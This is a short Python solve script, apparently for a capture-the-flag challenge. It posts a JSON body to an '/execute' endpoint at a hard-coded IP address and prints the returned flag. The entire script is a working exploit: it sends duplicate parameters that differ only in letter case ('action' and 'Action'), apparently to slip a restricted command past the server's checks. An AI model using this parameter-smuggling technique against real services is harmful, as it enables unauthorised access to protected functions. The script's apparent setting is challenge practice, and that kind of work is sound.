import requests
from rich import print_json

URL = "http://154.57.164.76:31065"

def hack():
    payloads = { 
        "action":"getSecureCode",
        "Action":"getcosmic"
        }
    headers= { "Content-Type": "application/json" }
    
    data = requests.post(f"{URL}/execute", headers=headers, json=payloads)
    return data.status_code, data.json()

flag = hack()
print_json(data=flag)